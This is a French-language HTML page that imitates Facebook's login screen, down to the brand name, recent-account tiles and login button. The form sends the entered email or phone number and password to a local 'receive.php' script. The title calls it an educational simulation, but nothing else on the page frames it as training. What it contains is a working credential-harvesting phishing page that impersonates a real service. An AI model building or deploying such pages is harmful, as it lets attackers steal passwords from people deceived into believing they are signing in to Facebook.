
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Simulation pédagogique — Connexion</title>
  <link rel="stylesheet" href="/assets/style.css" />
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline';" />
</head>
<body>


  <div class="container">
    <div class="left">
      <div class="brand">Facebook</div>
      <h2>Connexions récentes</h2>
      <div class="recent">
        <div class="card tile">
          <div class="avatar">+</div>
          <div class="name">Ajouter un compte</div>
        </div>
        <div class="card tile">
          <div class="avatar">+</div>
          <div class="name">Ajouter un compte</div>
        </div>
      </div>
    </div>

    <div class="right">
      <div class="card login">
        <form method="post" action="receive.php" class="box">
          <div class="field">
            <input class="input" name="email" type="text" autocomplete="off" placeholder="Adresse e‑mail ou numéro" required />
          </div>
          <div class="field">
            <input class="input" name="password" type="password" autocomplete="off" placeholder="Mot de passe" required />
          </div>
          <button class="btn btn-primary" type="submit">Se connecter</button>
          <a class="helper" href="#" onclick="return false">Mot de passe oublié ?</a>
        </form>
        <div class="box" style="text-align:center">
          <button class="btn btn-secondary" type="button" onclick="location.href='/'">Créer un nouveau compte</button>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
